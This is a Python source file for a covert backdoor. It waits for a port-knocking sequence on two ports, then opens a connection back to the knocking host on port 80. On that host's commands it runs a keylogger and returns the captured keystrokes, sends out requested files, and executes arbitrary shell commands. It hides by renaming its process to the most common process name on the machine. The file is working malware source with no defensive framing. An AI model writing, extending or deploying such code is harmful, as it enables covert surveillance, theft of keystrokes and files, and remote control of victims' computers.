import subprocess
import setproctitle
import psutil
from scapy.all import *
from watch import Watch
from keylog import Keylog
ipaddress = []
correct_knocks = []

def handle(pkt):
    if pkt['TCP'].flags != "RA":
        src_addr = pkt['IP'].src
        if src_addr not in ipaddress:
            ipaddress.append(src_addr)
            correct_knocks.append("")
        index = ipaddress.index(src_addr)

        if pkt['TCP'].dport == 19634 and pkt['TCP'].sport == 14369:
            correct_knocks[index] += "1"
        if pkt['TCP'].dport == 16343 and pkt['TCP'].sport == 13436:
            correct_knocks[index] += "2"
        if "1" in correct_knocks[index] and "2" in correct_knocks[index]:
            time.sleep(.5)
            print(f"making connection with {src_addr}")
            ipaddress.clear()
            correct_knocks.clear()
            connection(src_addr)


def get_best_process_name():
    process_dict = {}
    for proc in psutil.process_iter():
        try:
            process_name = proc.name()
            if process_name in process_dict:
                process_dict.update({process_name: process_dict.get(process_name) + 1})
            else:
                process_dict[process_name] = 1
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    best_process_name = next(iter(process_dict))
    for process_name in process_dict:
        if process_dict.get(process_name) > process_dict.get(best_process_name):
            best_process_name = process_name
    return best_process_name


def run_command(command):
    print(command)
    try:
        data = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = data.communicate()
    except Exception:
        out = ("psh: command not found: {}".format(command))
    return out

# problem is im prolly closing connection here by accident
def send_file(fileName, connection):
    with connection, open(fileName, 'rb') as f:
        connection.sendall(fileName.encode() + b'\n')
        connection.sendall(f'{os.path.getsize(fileName)}'.encode() + b'\n')
        # Send the file in chunks so large files can be handled.
        while True:
            data = f.read(4096)
            if not data: break
            connection.sendall(data)
        f.close()

def connection(ip):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, 80))
        print("connected")
        while True:
            command = s.recv(2048)
            result = ""
            if not command:
                break
            command = command.decode()
            command_type = command.split()[0]
            print(f"command {command}")
            print(f"command type: {command_type}")
            if command_type == "kstart":
                key_logger.start_keylogger()
                result = "keylogger started".encode()
            elif command_type == "kstop":
                key_logger.stop_keylogger()
                result = "keylogger stopped".encode()
            elif command_type == "kget":
                # key_logger.stop_keylogger()
                file = open(key_logger.log_file, "r")
                data = file.read()
                result = data.encode()
                file.close()
                key_logger.clear_log()
            elif command_type == "fget":
                # file = open(" ".join(command.split()[1:]), "r")
                send_file(" ".join(command.split()[1:]), s)
                result = "sent".encode()
            elif command_type == "wstart":
                print("wstart")
            elif command_type == "wstop":
                print("wstop")
            elif command_type == "wget":
                print("wget")
            elif command_type == "e":
                result = run_command(" ".join(command.split()[1:]))
            else:
                result = f"command {command_type} not found".encode()
            print(result)
            s.sendall(result)


if __name__ == '__main__':
    setproctitle.setproctitle(get_best_process_name())
    key_logger = Keylog()
    watch = Watch()
    while True:
        sniff(filter="tcp and dst port 19634 or (tcp and dst port 16343)", prn=handle)
